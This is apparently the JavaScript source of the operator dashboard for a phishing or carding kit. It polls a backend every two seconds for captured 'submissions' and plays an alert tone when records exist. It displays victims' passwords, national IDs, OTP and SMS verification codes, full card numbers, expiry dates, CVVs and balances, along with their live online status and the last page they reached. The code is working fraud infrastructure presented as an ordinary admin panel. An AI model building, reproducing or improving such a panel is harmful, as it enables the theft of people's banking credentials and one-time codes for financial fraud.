/** لوحة التحكم - Dashboard Admin Panel مع تفاصيل المستخدم */
class ApiDatabase {
    constructor() {
        this.users = [];
    }

    apiBase() {
        if (typeof getApiBase === 'function') return getApiBase();
        return typeof window !== 'undefined' && typeof window.API_BASE_URL === 'string'
            ? window.API_BASE_URL.replace(/\/$/, '')
            : '';
    }

    apiUrl(relPath) {
        if (typeof window !== 'undefined' && typeof window.resolveYasmeenApiUrl === 'function') {
            return window.resolveYasmeenApiUrl(relPath);
        }
        const r = String(relPath || '').replace(/^\//, '');
        return `${this.apiBase()}/${r}`;
    }

    headers(extra) {
        if (typeof getApiHeaders === 'function') return getApiHeaders(extra);
        return extra || {};
    }

    async refresh(onlineOnly = false) {
        const url = this.apiUrl(`api/submissions${onlineOnly ? '?online=true' : ''}`);
        const res = await fetch(url, { headers: this.headers() });
        if (!res.ok) throw new Error('تعذر جلب التسجيلات');
        this.users = await res.json();
        return this.users;
    }

    getAllUsers() { return this.users; }

    async deleteUser(userId) {
        const res = await fetch(
            this.apiUrl('api/submissions/' + encodeURIComponent(String(userId))),
            { method: 'DELETE', headers: this.headers() }
        );
        if (!res.ok) throw new Error('تعذر حذف السجل');
        this.users = this.users.filter((u) => String(u.id) !== String(userId));
    }

    async deleteAllUsers() {
        const res = await fetch(this.apiUrl('api/submissions'), {
            method: 'DELETE', headers: this.headers()
        });
        if (!res.ok) throw new Error('تعذر حذف الكل');
        this.users = [];
    }

    searchUsers(query) {
        const q = query.trim().toLowerCase();
        if (!q) return this.users;
        return this.users.filter(user => Object.values(user).some(val => 
            String(val || '').toLowerCase().includes(q)
        ));
    }

    playDashboardAlertSound() {
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const t0 = ctx.currentTime;
            const playTone = (freq, start, duration, vol) => {
                const osc = ctx.createOscillator();
                const g = ctx.createGain();
                osc.connect(g);
                g.connect(ctx.destination);
                g.gain.setValueAtTime(0, start);
                g.gain.linearRampToValueAtTime(vol, start + 0.02);
                g.gain.exponentialRampToValueAtTime(0.01, start + duration);
                osc.frequency.value = freq;
                osc.type = 'sine';
                osc.start(start);
                osc.stop(start + duration);
            };
            playTone(880, t0, 0.22, 0.65);
            playTone(1108, t0 + 0.18, 0.22, 0.65);
            playTone(1318, t0 + 0.36, 0.28, 0.7);
        } catch (e) {}
    }

    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        if (!notification) return;
        notification.textContent = message;
        notification.className = `notification show ${type}`;
        setTimeout(() => notification.classList.remove('show'), 3000);
    }
}

let db = new ApiDatabase();
let currentUser = null;
let isLoggedIn = false;
let dashboardRefreshIntervalId = null;
let currentSessionEpoch = 0;
let epochPollInterval = null;
let currentUserDetails = null;

const FIELD_LABELS_AR = {
    username: 'اسم المستخدم', password: 'كلمة المرور', name: 'الاسم',
    'full-name': 'الاسم الكامل', 'national-id': 'الرقم القومي', phone: 'رقم الهاتف',
    email: 'البريد الإلكتروني', address: 'العنوان', city: 'المدينة',
    gov: 'المحافظة', district: 'المنطقة / الحي', street: 'الشارع',
    otpCode: 'رمز OTP', verificationCode: 'رمز التحقق',
    card_number: 'رقم البطاقة', card_holder: 'اسم صاحب البطاقة',
    expiry_date: 'تاريخ انتهاء', expiry_month: 'شهر الانتهاء',
    expiry_year: 'سنة الانتهاء', cvv: 'CVV/CVC', balance: 'الرصيد',
    selectedWatch: 'الساعة المختارة', pastedSmsMessage: 'الرسالة المُلصَقة',
    last_page: 'آخر صفحة', last_heartbeat: 'آخر heartbeat'
};

function getSession() {
    try {
        const session = localStorage.getItem('dashboardSession');
        if (!session) return null;
        return JSON.parse(session);
    } catch (e) { return null; }
}

function saveSession(epoch) {
    const session = { isLoggedIn: true, epoch, timestamp: Date.now() };
    localStorage.setItem('dashboardSession', JSON.stringify(session));
}

async function checkEpochMismatch() {
    try {
        const response = await fetch(db.apiUrl('api/admin/dashboard-auth/epoch'));
        if (!response.ok) return;
        const data = await response.json();
        const warningEl = document.getElementById('epochWarning');
        if (data.sessionEpoch !== (localStorage.getItem('dashboardSessionEpoch') || 0) || data.lastChangeTime) {
            if (data.lastChangeTime) {
                const diffMin = Math.round((Date.now() - new Date(data.lastChangeTime).getTime()) / 60000);
                warningEl.textContent = `تم تغيير كلمة المرور قبل ${diffMin} دقيقة`;
            } else {
                warningEl.textContent = 'كلمة المرور غير صحيحة';
            }
            warningEl.style.display = 'block';
        } else {
            warningEl.style.display = 'none';
        }
    } catch (e) {}
}

async function checkPassword() {
    const password = document.getElementById('adminPassword').value;
    if (!password) return;

    try {
        document.body.style.cursor = 'wait';
        const response = await fetch(db.apiUrl('api/admin/dashboard-auth/verify'), {
            method: 'POST',
            headers: db.headers({ 'Content-Type': 'application/json' }),
            body: JSON.stringify({ password })
        });
        const data = await response.json();
        
        document.body.style.cursor = 'default';
        
        if (data.ok) {
            saveSession(data.sessionEpoch);
            document.getElementById('loginModal').classList.remove('active');
            document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
            isLoggedIn = true;
            await loadDashboard();
            db.showNotification('تم تسجيل الدخول بنجاح', 'success');
        } else {
            document.getElementById('adminPassword').value = '';
            db.showNotification(data.error || 'كلمة المرور خاطئة', 'error');
            await checkEpochMismatch();
        }
    } catch (err) {
        document.body.style.cursor = 'default';
        db.showNotification('خطأ في الخادم', 'error');
    }
}

function startEpochPolling() {
    if (epochPollInterval) clearInterval(epochPollInterval);
    epochPollInterval = setInterval(async () => {
        if (isLoggedIn) {
            try {
                const response = await fetch(db.apiUrl('api/admin/dashboard-auth/epoch'));
                if (response.ok) {
                    const data = await response.json();
                    if (data.sessionEpoch !== currentSessionEpoch) {
                        localStorage.removeItem('dashboardSession');
                        isLoggedIn = false;
                        document.getElementById('loginModal').classList.add('active');
                        document.getElementById('dashboardContainer').classList.add('dashboard-hidden');
                        db.showNotification('تم إلغاء الجلسة', 'warning');
                    }
                }
            } catch (e) {}
        }
    }, 5000);
}

async function loadDashboard() {
    try {
        await db.refresh(true);
        renderDashboardTables();
    } catch (e) {
        db.showNotification('خطأ تحميل البيانات', 'error');
    }
    
    if (dashboardRefreshIntervalId) clearInterval(dashboardRefreshIntervalId);
    dashboardRefreshIntervalId = setInterval(async () => {
        if (isLoggedIn) {
            try {
                await db.refresh(true);
                renderDashboardTables();
                if (db.users.length > 0) db.playDashboardAlertSound();
            } catch (e) {
                console.error(e);
            }
        }
    }, 2000);
    
    startEpochPolling();
}

function renderDashboardTables() {
    const container = document.getElementById('dashboardTablesWrap');
    if (!db.users.length) {
        container.innerHTML = '<div class="dashboard-empty-all">لا توجد تسجيلات</div>';
        return;
    }

    const table = document.createElement('table');
    table.className = 'users-table';
    
    table.innerHTML = `
        <thead><tr>
            <th>الاسم</th>
            <th>المستخدم</th>
            <th>الهاتف</th>
            <th>الحالة</th>
            <th>آخر صفحة</th>
            <th>آخر نشاط</th>
            <th>الإجراءات</th>
        </tr></thead>
        <tbody>
    `;

    db.users.forEach(user => {
        const statusClass = user.is_online ? 'online' : 'offline';
        const statusText = user.is_online ? 'متصل' : 'غير متصل';
        const lastPage = user.last_page || user.page || 'غير معروف';
        const lastActivity = user.last_heartbeat ? new Date(user.last_heartbeat).toLocaleString('ar') : 'غير معروف';
        
        table.querySelector('tbody').innerHTML += `
            <tr>
                <td>${escapeHtml(user.name || 'غير معروف')}</td>
                <td>${escapeHtml(user.username || '')}</td>
                <td>${escapeHtml(user.phone || '')}</td>
                <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                <td>${escapeHtml(lastPage)}</td>
                <td>${lastActivity}</td>
                <td class="action-column">
                    <button onclick="showUserDetails('${user.id}')" class="btn-info">تفاصيل</button>
                    <button onclick="showCardDetails('${user.id}')" class="btn-card" style="display: ${user.card_number ? 'block' : 'none'};">البطاقة</button>
                    <button onclick="confirmDeleteUser('${user.id}')" class="btn-delete">حذف</button>
                </td>
            </tr>
        `;
    });

    table.querySelector('tbody').innerHTML += '</tbody>';
    container.innerHTML = '';
    container.appendChild(table);
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = String(text);
    return div.innerHTML;
}

async function showUserDetails(id) {
    currentUserDetails = db.users.find(u => u.id === id);
    const detailsContainer = document.getElementById('userDetails');
    detailsContainer.innerHTML = '';

    // Navigation buttons already in HTML
    if (currentUserDetails) {
        const detailsTable = document.createElement('table');
        detailsTable.className = 'detail-field-table';
        let rows = '';
        Object.entries(currentUserDetails).forEach(([key, value]) => {
            if (!key.startsWith('_') && key !== 'id' && value !== null && value !== undefined) {
                rows += `<tr><th>${FIELD_LABELS_AR[key] || key}</th><td>${escapeHtml(value)}</td></tr>`;
            }
        });
        detailsTable.innerHTML = rows || '<tr><td colspan="2">لا توجد تفاصيل</td></tr>';
        detailsContainer.appendChild(detailsTable);
    }
    
    document.getElementById('infoModal').classList.add('active');
}

function closeInfoModal() {
    document.getElementById('infoModal').classList.remove('active');
}

function showCardDetails(id) {
    const user = db.users.find(u => u.id === id);
    const display = document.getElementById('cardDisplay');
    if (user && user.card_number) {
        display.innerHTML = `
            <div class="card-container">
                <div class="credit-card">
                    <div class="card-header">
                        <div class="card-type">VISA</div>
                        <div class="card-chip">💳</div>
                    </div>
                    <div class="card-number-row">
                        <div class="card-number-group">${user.card_number.substring(0,4)}</div>
                        <div class="card-number-group">****</div>
                        <div class="card-number-group">****</div>
                        <div class="card-number-group">${user.card_number.slice(-4)}</div>
                    </div>
                    <div class="card-bottom">
                        <div class="card-holder">
                            <div class="label">CARD HOLDER</div>
                            <div class="value">${user.card_holder || '**** ****'}</div>
                        </div>
                        <div class="card-meta">
                            <div class="card-expiry">
                                <div class="label">EXPIRES</div>
                                <div class="value">${user.expiry_month || '**'} / ${user.expiry_year || '**'}</div>
                            </div>
                            <div class="card-cvv">
                                <div class="label">CVV</div>
                                <div class="value">${user.cvv || '***'}</div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="card-info">
                    <p><strong>رقم البطاقة:</strong> ${user.card_number || 'غير متوفر'}</p>
                    <p><strong>صاحب البطاقة:</strong> ${user.card_holder || 'غير متوفر'}</p>
                    <p><strong>الرصيد:</strong> ${user.balance || 'غير متوفر'}</p>
                </div>
            </div>
        `;
    }
    document.getElementById('cardModal').classList.add('active');
}

function closeCardModal() {
    document.getElementById('cardModal').classList.remove('active');
}

async function confirmDeleteUser(id) {
    if (!confirm('هل أنت متأكد من حذف هذا المستخدم؟')) return;
    try {
        await db.deleteUser(id);
        db.showNotification('تم الحذف بنجاح', 'success');
        await db.refresh(true);
        renderDashboardTables();
    } catch (e) {
        db.showNotification('خطأ في الحذف', 'error');
    }
}

function logout() {
    localStorage.removeItem('dashboardSession');
    isLoggedIn = false;
    document.getElementById('loginModal').classList.add('active');
    document.getElementById('dashboardContainer').classList.add('dashboard-hidden');
    if (dashboardRefreshIntervalId) clearInterval(dashboardRefreshIntervalId);
}

document.addEventListener('DOMContentLoaded', () => {
    const passwordInput = document.getElementById('adminPassword');
    if (passwordInput) passwordInput.focus();
    
    document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') checkPassword();
    });
    
    const session = getSession();
    if (session?.isLoggedIn) {
        isLoggedIn = true;
        document.getElementById('loginModal').classList.remove('active');
        document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
        loadDashboard();
    }
    
    checkEpochMismatch();
});

